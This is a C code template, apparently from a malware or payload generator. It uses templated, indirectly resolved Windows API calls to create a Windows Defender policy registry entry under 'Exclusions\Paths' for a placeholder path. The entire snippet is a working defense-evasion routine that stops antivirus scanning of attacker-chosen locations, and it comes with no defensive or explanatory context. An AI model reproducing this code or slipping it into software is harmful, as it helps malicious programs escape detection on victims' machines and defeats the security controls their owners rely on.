HKEY hKey = NULL;
DWORD dwValue = 0;
DWORD dwDisposition;
LONG result;

result = {{ WINAPI("RegCreateKeyExW") }}(
    HKEY_LOCAL_MACHINE,
    L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths",
    0,
    NULL,
    REG_OPTION_NON_VOLATILE,
    KEY_SET_VALUE,
    NULL,
    &hKey,
    &dwDisposition);
if (result != ERROR_SUCCESS) return;

result = {{ WINAPI("RegSetValueExW") }}(
    hKey,
    L"{{ exclusion_path }}",
    0,
    REG_DWORD,
    (const BYTE *)&dwValue,
    sizeof(dwValue));

{{ WINAPI("RegCloseKey") }}(hKey);
